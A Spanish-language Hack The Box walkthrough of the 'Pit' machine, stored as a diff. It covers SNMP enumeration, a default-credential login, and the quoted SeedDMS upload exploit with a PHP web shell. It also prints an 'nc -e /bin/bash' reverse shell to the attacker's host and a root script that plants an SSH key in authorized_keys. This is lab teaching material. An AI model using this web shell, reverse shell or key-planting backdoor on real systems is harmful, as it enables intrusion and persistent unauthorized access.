@@ -1,0 +1,344 @@
+I"a<p><img src="https://user-images.githubusercontent.com/71317374/134777660-4de10361-6209-4001-8945-4fd44dd01fd2.png" alt="imagen" /></p>
+
+<p>Máquina Linux de nivel medio creada por <a href="https://app.hackthebox.eu/users/159204">polarbearer</a> y <a href="https://app.hackthebox.eu/users/125033">GibParadox</a>. Vamos a darnos un paseo por el servicio SNMP para encontrar un lugar oculto con el que podemos ejecutar comandos, entraremos en un panel de control con una shell expuesta y volveremos a pasearnos por el SNMP para convertirnos en <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>Veamos como clasifica la gente esta gran máquina:</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134777685-3d30f47e-5b3a-4bf4-97eb-41aaba7c35f1.png" alt="imagen" /></p>
+
+<p>No muy real pero va a haber que enumerar a muerte y hacer algo de explotación personalizada, interesante.</p>
+
+<ol>
+  <li><a href="#recon">Reconocimiento inicial</a></li>
+  <li><a href="#snmp">Enumeramos el servicio SNMP</a></li>
+  <li><a href="#rce">Conseguimos RCE</a></li>
+  <li><a href="#shell">Conseguimos acceso</a></li>
+  <li><a href="#root">Rooted!</a></li>
+</ol>
+
+<h1 id="recon">Reconocimiento inicial</h1>
+
+<p>Como siempre, empezamos con un escaneo del poderoso <code class="language-plaintext highlighter-rouge">nmap</code>. Yo he hecho todo el escaneo TCP en el mismo comando, aunque también se puede hacer por separado.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.92 scan initiated Sat Sep 25 17:59:25 2021 as: nmap -p- --open -n -vv -sS --min-rate 4000 -sCV -oN scan 10.10.10.241</span>
+Nmap scan report <span class="k">for </span>10.10.10.241
+Host is up, received echo-reply ttl 63 <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-09-25 17:59:26 CEST <span class="k">for </span>224s
+Not shown: 65494 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 38 filtered tcp ports <span class="o">(</span>admin-prohibited<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT     STATE SERVICE         REASON         VERSION
+22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9C
+| &lt;más cosas&gt;
+| /Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr
+|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVA
+|   256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
+80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
+|_http-title: Test Page <span class="k">for </span>the Nginx HTTP Server on Red Hat Enterprise Linux
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.1
+9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 Bad request
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf8
+|     Transfer-Encoding: chunked
+|     X-DNS-Prefetch-Control: off
+|     Referrer-Policy: no-referrer
+|     X-Content-Type-Options: nosniff
+|     Cross-Origin-Resource-Policy: same-origin
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;title&gt;
+|     request
+|     &lt;/title&gt;
+|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
+|     &lt;style&gt;
+|     body <span class="o">{</span>
+|     margin: 0<span class="p">;</span>
+|     font-family: <span class="s2">"RedHatDisplay"</span>, <span class="s2">"Open Sans"</span>, Helvetica, Arial, sans-serif<span class="p">;</span>
+|     font-size: 12px<span class="p">;</span>
+|     line-height: 1.66666667<span class="p">;</span>
+|     color: <span class="c">#333333;</span>
+|     background-color: <span class="c">#f5f5f5;</span>
+|     border: 0<span class="p">;</span>
+|     vertical-align: middle<span class="p">;</span>
+|     font-weight: 300<span class="p">;</span>
+|_    margin: 0 0 10p
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
+| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US/organizationalUnitName<span class="o">=</span>ca-5763051739999573755
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-04-16T23:29:12
+| Not valid after:  2030-06-04T16:09:12
+| MD5:   0146 4fba 4de8 5bef 0331 e57e 41b4 a8ae
+| SHA-1: 29f2 edc3 7ae9 0c25 2a9d 3feb 3d90 bde6 dfd3 eee5
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIEpjCCAo6gAwIBAgIISl2h4yex5dEwDQYJKoZIhvcNAQELBQAwbzELMAkGA1UE
+| BhMCVVMxKTAnBgNVBAoMIDRjZDkzMjk1MjMxODRiMGVhNTJiYTBkMjBhMWE2Zjky
+| MR8wHQYDVQQLDBZjYS01NzYzMDUxNzM5OTk5NTczNzU1MRQwEgYDVQQDDAtkbXMt
+| cGl0Lmh0YjAeFw0yMDA0MTYyMzI5MTJaFw0zMDA2MDQxNjA5MTJaME4xCzAJBgNV
+| BAYTAlVTMSkwJwYDVQQKDCA0Y2Q5MzI5NTIzMTg0YjBlYTUyYmEwZDIwYTFhNmY5
+| MjEUMBIGA1UEAwwLZG1zLXBpdC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
+| ggEKAoIBAQDZLaNRUf3BXYCd+Df9XZwMBmIwGzy/yX+9fPY6zGXYEYS7SeH9xZ7p
+| GTUQMfk30Olb7rzftCKx9xSMHyoCJIAWFeVDV9vxJbGaEqFRvKHPeqcpQbRAKoqL
+| xWaqbDZCXsBtTVYEwpRHvJ/GoGEWAQSbP1zkHzvVBkHuXE7Sj0zlW5NaBjvG/wEe
+| wAB6crwnIYoqC550cMPritvjLwijk9nhwaPJ462anhJR5vFBvkR4nqD3mhIytUOb
+| YMsfVoI0FiXtlBdu1ApABxtIdQgkY94eRAaMTkQ4Je0a8G5PlRZ20xCdqHb3xIZV
+| 1mphZehkUeN0MzgEloL5TX8Zab+LZW+ZAgMBAAGjZzBlMA4GA1UdDwEB/wQEAwIF
+| oDAJBgNVHRMEAjAAMCcGA1UdEQQgMB6CC2Rtcy1waXQuaHRigglsb2NhbGhvc3SH
+| BH8AAAEwHwYDVR0jBBgwFoAUc8ssOet8O2a3+F2If4eQixSV7PwwDQYJKoZIhvcN
+| AQELBQADggIBAG8kou51q78wdzxiPejMv9qhWlBWW3Ly5TvAav07ATx8haldEHvT
+| LlFNGPDFAvJvcKguiHnGrEL9Im5GDuzi31V4fE5xjzWJdkepXasK7NzIciC0IwgP
+| 7G1j11OUJOt9pmDRu2FkTHsSdr5b57P4uXS8rRF5lLCEafuemk6ORXa07b9xSrhC
+| 3pWl22RtVlTFQ3wX8OsY0O3w5UUz8T/ezhKYUoM/mYQu+ICTAltlX4xae6PGauCh
+| uaOY+/dPtM17KfHSbnCS1ZnR0oQ4BXJuYNfOR/C59L5B7TWzaOx5n1TD6JHOzrDu
+| LxjO0OTeFaBRXL/s2Z5zNPTpZVnHyKEmHr5ZObjR6drDGqXfShPq5y70RfE28Pxm
+| VTCdK4MCqDkELIlXrxzHQ/IPC8pxho6WEQsY80xZ1nXbLshlymh6clgblOetToZT
+| HObIkEoPBtszUssFmWSN5hd4JcuyqSbJhichYtFQRASb2I4jWdP831LPir+MCGQv
+| iAnieBF8zYus7kboTwfXmBGUt6r6eNE1yr4ZXPxOZoWq2ob6aAeLp2mqif+jgUSk
+| fiG9oiAoyXWxw5pLfYHxVQGY+rGbjOs8gCAxBaTPt6dCkHZy/nU8PNZtV6QC4OME
+| LI/sYtmG8XENdQhsLM2sewOMvv5rgsZ8SlX05Bw8C1xuq5Rg1KewCjlY
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9090-TCP:V<span class="o">=</span>7.92%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>9/25%Time<span class="o">=</span>614F47BF%P<span class="o">=</span>x86_64-pc-linux-gn
+<span class="nt">--</span> no nos interesa :p <span class="nt">--</span>
+SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="se">\x</span>200<span class="se">\x</span>2010p<span class="s2">");
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Sep 25 18:03:10 2021 -- 1 IP address (1 host up) scanned in 224.81 seconds
+</span></code></pre></div></div>
+
+<h3 id="pequeña-explicación-de-los-parámetros-de-nmap">Pequeña explicación de los parámetros de nmap</h3>
+<ul>
+  <li>-p-: Escanea todos los puertos.</li>
+  <li>–open: Solo muestra los que están abiertos.</li>
+  <li>–min-rate: Envía un mínimo de paquetes por segundo para que vaya más rápido, con un número muy alto, como 10000, puede dar falsos positivos o negativos.</li>
+  <li>-sS: TCP SYN Port Scan, agiliza un poco el escaneo ya que no espera a que se complete el <a href="https://networksigma.com/tcp-3-way-handshake/">Three-Way Handshake</a>.</li>
+  <li>-Pn: Deshabilita el descubrimiento de host mediante el protocolo ARP a la máquina para comprobar si está activa (no confundir con pene, que luego pasan cosas).</li>
+  <li>-n: Deshabilita la resolución DNS.</li>
+  <li>-v: Muestra los puertos a medida que los descubre.</li>
+  <li>-oN: Guarda el escaneo como aparece por consola.</li>
+  <li>-sCV: Lanza unos scripts básicos de enumeración y detecta la versión que corre cada servicio.</li>
+</ul>
+
+<p>Bueno, pues tenemos estos puertos abiertos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH, para obtener una shell segura</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">Nginx 1.14.1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">9090</td>
+      <td style="text-align: left">Se supone que zeus-admin, pero ni nmap lo sabe</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y además un subdominio, que está en el certificado del puerto 9090, dms-pit.htb, lo que nos indica que el dominio pit.htb existe, entonces habría que agregar esto al archivo /etc/hosts</p>
+
+<h3 id="puerto-80">Puerto 80</h3>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134778228-1b5c3f89-d71c-465f-be8f-c3caa4d54e3b.png" alt="imagen" /></p>
+
+<p>Na’ de na’.</p>
+
+<h3 id="puerto-9090">Puerto 9090</h3>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134778282-01f9c06b-d2e5-40e5-b997-d42b3540e037.png" alt="imagen" /></p>
+
+<p>Un panel de login(para el que no tenemos credenciales, obviamente 😔), un dominio(pit.htb) y nos dice la distro que usa, CentOS.</p>
+
+<h1 id="snmp">Enumeramos el servicio SNMP</h1>
+<p>Visto lo visto, no tenemos formas de comprometer la máquina, así que nos vemos en la siguiente. A menos… que tenga alguna cosilla por UDP, que no se usa mucho en esta plataforma.</p>
+
+<p>Hice un escaneo de todos los puertos que no me reportaba nada, así que hice uno más específico. Recordé la máquina Mischief, que la hicieron s4vitar(no encontré el stream) e <a href="https://youtube.com/watch?v=GKo6xoB1g4Q">ippsec</a>, en la que hacen un escaneo del puerto 161 por UDP, para luego usar <code class="language-plaintext highlighter-rouge">onesixtyone</code>, que bruteforcea la <a href="https://www.dnsstuff.com/snmp-community-string">community string</a> del servicio SNMP, y luego usar <code class="language-plaintext highlighter-rouge">snmpwalk</code> para enumerar procesos internos de la máquina.</p>
+
+<p>Y si comprobamos si el puerto 161 en UDP está abierto…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.92 scan initiated Sat Sep 25 18:25:43 2021 as: nmap -p161 -sU -oN udp 10.10.10.241</span>
+Nmap scan report <span class="k">for </span>10.10.10.241
+Host is up <span class="o">(</span>0.052s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+<span class="c"># Nmap done at Sat Sep 25 18:25:43 2021 -- 1 IP address (1 host up) scanned in 0.34 seconds</span>
+</code></pre></div></div>
+
+<p>Lo estáaaaaaa, así que podemos usar estas herramientas para comprometer la máquina.
+Las community strings de este SNMP estaban por defecto, así que no hizo falta usar <code class="language-plaintext highlighter-rouge">onesixtyone</code> para hacer fuerza bruta, únicamente <code class="language-plaintext highlighter-rouge">snmpwalk</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SNMPv2-MIB::sysDescr.0 <span class="o">=</span> STRING: Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 <span class="c">#1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64</span>
+SNMPv2-MIB::sysObjectID.0 <span class="o">=</span> OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+DISMAN-EVENT-MIB::sysUpTimeInstance <span class="o">=</span> Timeticks: <span class="o">(</span>12802197<span class="o">)</span> 1 day, 11:33:41.97
+SNMPv2-MIB::sysContact.0 <span class="o">=</span> STRING: Root &lt;root@localhost&gt; <span class="o">(</span>configure /etc/snmp/snmp.local.conf<span class="o">)</span>
+SNMPv2-MIB::sysName.0 <span class="o">=</span> STRING: pit.htb
+SNMPv2-MIB::sysLocation.0 <span class="o">=</span> STRING: Unknown <span class="o">(</span>edit /etc/snmp/snmpd.conf<span class="o">)</span>
+&lt;cositas que no sirven&gt;
+UCD-SNMP-MIB::prErrFixCmd.1 <span class="o">=</span> STRING: 
+UCD-SNMP-MIB::dskPath.1 <span class="o">=</span> STRING: /
+UCD-SNMP-MIB::dskPath.2 <span class="o">=</span> STRING: /var/www/html/seeddms51x/seeddms
+&lt;más cosas&gt;
+NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">"monitoring"</span> <span class="o">=</span> STRING: /usr/bin/monitor
+&lt;más cosas aún&gt;
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.23 <span class="o">=</span> STRING: login
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.24 <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.25 <span class="o">=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.26 <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.27 <span class="o">=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       <span class="k">*</span>
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.28 <span class="o">=</span> STRING: michelle             user_u               s0                   <span class="k">*</span>
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.29 <span class="o">=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       <span class="k">*</span>
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.30 <span class="o">=</span> STRING: System <span class="nb">uptime
+</span>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.31 <span class="o">=</span> STRING:  12:45:19 up 1 day, 11:35,  1 user,  load average: 0.28, 0.07, 0.02
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">"monitoring"</span>.31 <span class="o">=</span> No more variables left <span class="k">in </span>this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span>
+</code></pre></div></div>
+<p>:000 una ruta nueva, dos usuarios(root y michelle), y lo que parece que es un binario.</p>
+
+<h1 id="rce">Conseguimos RCE</h1>
+
+<p>Ahora que tenemos una ruta para hacer cositas 😈, podemos ver si usa algún gestor de contenidos vulnerable y a partir de ahí seguir partiéndolo.
+Si nos dirigimos a dms-pit.htb/seeddms51x/seeddms nos topamos con un login.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134779941-3f8b6186-c9c6-4d9b-9048-d7f81f9aebaa.png" alt="imagen" /></p>
+
+<p>Abajo nos está diciendo que el acceso solo se permite a personal autorizado, y yo no lo soy, así que ya hemos terminado, espero que os haya gustado 😄.</p>
+
+<p>O nos ponemos un poco blackhat y entramos. Como teníamos un usuario llamado michelle, podríamos probar las credenciales <code class="language-plaintext highlighter-rouge">michelle:michelle</code> y pa’ dentro.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780028-e7a5a303-5497-4c74-93c2-9988de31b3ea.png" alt="imagen" /></p>
+
+<p>En efecto, pa’ dentro. Vemos una carpeta llamada Docs y una nota llamada ‘Upgrade Note’.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780042-b2b7ecc7-8ad1-4f0f-aad2-bb40e6262448.png" alt="imagen" /></p>
+
+<p>La nota dice que han actualizado SeedDMS a la versión 5.1.15 por problemas de seguridad, y así ya sabemos qué exploits NO probar, aunque igual funcionan…</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780074-6a3fa968-258e-4998-9f52-e71fce5bbad3.png" alt="imagen" /></p>
+
+<p>Viendo los exploits disponibles, el que más llama la atención es la RCE, aunque es para una versión anterior. No sé por qué, el exploit funciona, yo creo que la nota ha sido un farol para evitar que los hackeen.</p>
+
+<p>Este es el exploit:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
+# Google Dork: [NA]
+# Date: [20-June-2019]
+# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
+# Vendor Homepage: [https://www.seeddms.org]
+# Software Link: [https://sourceforge.net/projects/seeddms/files/]
+# Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
+# Tested on: [NA]
+# CVE : [CVE-2019-12744]
+
+Exploit Steps:
+
+Step 1: Login to the application and under any folder add a document.
+Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
+
+PHP Backdoor Code:
+&lt;?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "&lt;pre&gt;";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "&lt;/pre&gt;";
+        die;
+}
+
+?&gt;
+
+Step 3: Now after uploading the file check the document id corresponding to the document.
+Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
+
+Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
+</code></pre></div></div>
+
+<p>Según dice, podemos crear una backdoor en PHP en cualquier carpeta en la que podamos escribir, en nuestro caso Docs/Users/Michelle, anotamos el ID correspondiente al documento y nos vamos a la ruta dms-pit.htb/seeddms51x/seeddms/Docs/Users/Michelle/id/1.php(el archivo se tiene que llamar así, si no no funciona y no sé muy bien por qué), y mediante el parámetro cmd le pasamos un comando a ejecutar, aunque yo usé una fake shell que creó <a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py">Lanz</a>(dadle una estrella porque se lo merece). Con la fake shell estuve enumerando un rato hasta que llegué a la ruta <code class="language-plaintext highlighter-rouge">/var/www/html/seeddms51x/conf/settings.xml</code>, que contiene unas credenciales bastante interesantes:</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780702-e2e0a1a7-28f2-436b-a4d2-c019ee07340f.png" alt="imagen" /></p>
+
+<p>Sirven para un mySQL, pero ¿y si las usamos en el panel de login del puerto 9090? Pues que funcionan.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780746-82919ccc-de60-4b34-9903-211b67de4cd8.png" alt="imagen" /></p>
+
+<h1 id="shell">Conseguimos acceso</h1>
+
+<p>Y estaríamos dentrooooooooooooowowowowowowoooooooooo, y además con algo llamado Terminal, que tiene un uso bastante claro.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780764-959a1ba8-4d10-444d-a7da-c6caea9b901b.png" alt="imagen" /></p>
+
+<p>EXACTOOOO, es una terminal como Michelle!! Entonces solo hay que enviarnos una reverse shell y pa’ dentrooooo
+Y encima tiene una versión relativamente nueva de <code class="language-plaintext highlighter-rouge">netcat</code>, así que con el comando <code class="language-plaintext highlighter-rouge">nc -e /bin/bash tuip tupuerto</code> estarías dentro como Michelle.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134780824-1004e84a-86ce-4ada-905a-a165b4f5863f.png" alt="imagen" /></p>
+
+<p>Y ya si quieres, coges la User Flag, o no, como quieras. Para que no se nos vaya la shell a hacer puñetas con un ctrl+c y además hacerla interactiva, podemos hacer un <a href="https://www.thehackersnow.com/tratamiento-de-una-tty/">tratamiento de la TTY</a>.</p>
+
+<p>Con esto hecho, podríamos seguir en nuestro avance hacia la cocina.</p>
+
+<p>#Rooteada! {#root}
+¿Os acordáis del archivo /usr/bin/monitor que apareció en la enumeración del servicio SNMP? Bien, pues es un script en bash bastante interesante, ya que coge todo lo que hay en /usr/local/monitoring y que se llama check [loquesea] sh y lo interpreta con bash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[michelle@pit ~]$ cat /usr/bin/monitor
+#!/bin/bash
+
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+</code></pre></div></div>
+<p>Si comprobamos si tenemos permiso para escribir en /usr/local/monitoring:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local | <span class="nb">grep </span>monitoring
+drwxrwx---+ 2 root root 182 Sep 25 13:40 monitoring
+</code></pre></div></div>
+<p>Lo tenemoooooooooooooooos, así que solo faltaría colar un script que haga algo malo 😈 y nos metemos hasta la cocina. En este caso he optado por meter mi clave pública de SSH en el directorio /root/.ssh/authorized_keys, así que primero generamos nuestra clave pública:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> rsa
+</code></pre></div></div>
+
+<p>Luego creamos el script <code class="language-plaintext highlighter-rouge">check_this.sh</code>(para nada es malicioso, por si te lo preguntabas, te invito a descargarlo y ejecutarlo como root):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCn5F6YKC/xjiOdfvGLlq8CAu+6PtKF51x+nIxn55B73EPQ7Ev1aD/UOgtyQMysW7IGqs1XDu+bIGW6SM+JzLnuDokcCGH0NqleXlnYvMQrlWiaM1jiCBcdfl7Y6XqeAsE/jkcE4vyckZpBz1YyY/fE2fAmfRSrQh5Z80aBMhbGWTisfwChnN2c25t2sqTu8+9INf4LmHTntQbsAaRHh0MmTnSqsi/Sv2+8k1i2NvHrlGIDK4LycF5eYZcJk6XrTj02JIu86t/DE6/uXXPPK1qqlFHjYOU/SSZ83GjX++Q51bk7iHEGY4dKq0I2JaZ07TrHGs0qpiSb4Hg+OMelskK+TIeeztm71HcNnMq/LpSpT9k2WqZFwM6u9/wBSYB/JY6P+aZzIF03QX7yvME62BOgdSyMsZ+h8YL6/isi/
+/PqsSTiZj8lbgU1+L997WwIelq6/y0hCm0/prl8QDcQdmTGSZofM9+4TOqRpR//7C4kcC131CQosrpQ11XbuEwFFCgT8= root@binlab"</span> <span class="o">&gt;</span> /root/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Ahora solo faltaría meterlo en /usr/local/monitoring y esperar.
+Pues esperé y no pasó nada, así que supongo que necesitará alguna interacción, como volver a ejecutar snmpwalk o algo así.</p>
+
+<p>Si volvemos a ejecutar snmpwalk, pero ahora pasándole <code class="language-plaintext highlighter-rouge">NET-SNMP-EXTEND-MIB::nsExtendObjects</code> al final para que ejecute scripts(ejem, ejem, /usr/bin/monitor, ejem, ejem) nos debería ejecutar el script, y entonces…</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/134781459-ff4023d2-b722-4d56-9d4f-1ad5e8cd401b.png" alt="imagen" /></p>
+
+<p>VAMOOOOOOOOOOOOOOOOOOOOOOOOO HASTA LA COCINAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
+
+<p>VALE. YA. NI MÁS. NI MENOS</p>
+
+<p>Si te ha gustado dame <a href="https://github.com/binlaab">follow y alguna estrellita, que no te cuesta 😡</a></p>
+:ET
